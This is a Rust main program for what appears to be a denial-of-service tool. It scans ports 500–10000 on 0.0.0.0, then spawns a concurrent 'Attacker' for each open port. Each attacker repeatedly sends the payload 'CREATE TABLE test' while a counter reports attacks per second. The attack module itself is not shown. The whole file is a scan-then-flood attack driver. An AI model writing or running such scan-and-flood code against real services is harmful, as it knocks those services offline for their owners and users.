use crate::dos::Attacker;
use crate::rust_scan::port_strategy::SerialRange;
use crate::rust_scan::{PortRange, PortStrategy, ScanOrder};
use rust_scan::Scanner;
use std::borrow::BorrowMut;
use std::net::{IpAddr, Ipv4Addr};
use std::sync::Arc;
use std::thread::sleep;
use std::time::Duration;
use std::{io, thread, time};
use futures::prelude::*;

#[macro_use]
extern crate tokio;

////////////////////////////////////////////////////////////////////////////////////////////////////
// Rust Scan

#[macro_use]
extern crate log;
////////////////////////////////////////////////////////////////////////////////////////////////////

mod dos;
mod rust_scan;

use atomic_counter::*;
use futures::stream::FuturesUnordered;
use rayon::prelude::*;

fn print_counter(counter: Arc<dyn AtomicCounter<PrimitiveType = usize>>, threshold: usize) {
    let mut prints_done: usize = 0;
    let mut previous_time = time::SystemTime::now();
    let mut previous_count: usize = 0;

    loop {
        if counter.get() >= threshold * (prints_done + 1) {
            let val = counter.get();
            prints_done += 1;
            println!(
                "Counter: {}, attacks per second: {}",
                val,
                (val - previous_count) as f64
                    / (time::SystemTime::now()
                        .duration_since(previous_time)
                        .unwrap()
                        .as_secs() as f64)
            );

            previous_count = val;
            previous_time = time::SystemTime::now();
        }
        sleep(Duration::from_millis(100));
    }
}

#[tokio::main(flavor = "multi_thread", worker_threads = 16)]
// #[tokio::main()]
async fn main() {
    let attack_counter: Arc<dyn AtomicCounter<PrimitiveType = usize>> =
        Arc::new(RelaxedCounter::new(0));
    let scanner = Scanner::new(
        &[IpAddr::V4(Ipv4Addr::new(0, 0, 0, 0))],
        16,
        Duration::from_millis(50),
        32,
        false,
        PortStrategy::pick(
            &Some(PortRange {
                start: 500,
                end: 10000,
            }),
            None,
            ScanOrder::Serial,
        ),
        false,
    );

    let ports = scanner.run().await;

    println!("Attacking addresses: {:#?}", ports);
    let attackers = ports.iter().map(|addr| {
        Attacker::new(
            *addr,
            Vec::from("CREATE TABLE test"),
            100,
            attack_counter.clone(),
        )
    });

    // sleep(Duration::from_secs(10));
    let counter_print = attack_counter.clone();
    let _handler = thread::spawn(move || print_counter(counter_print, 1000));

    attackers
        .clone()
        .filter(|res| res.is_err())
        .for_each(|err| println!("Error: {}", err.err().unwrap()));


    let mut attack_futures = attackers
        .filter(|res| res.is_ok())
        .map(|ok_att| tokio::spawn(ok_att.unwrap().run()))
        .collect::<FuturesUnordered<_>>();

    futures::future::join_all(&attack_futures).await;

    println!("Attacking done");
    // for attack in attackers {
    //     match attack {
    //         Ok(a) => a.run().await.unwrap(),
    //         Err(errors) => error!("{}", errors),
    //     }
    // }
}
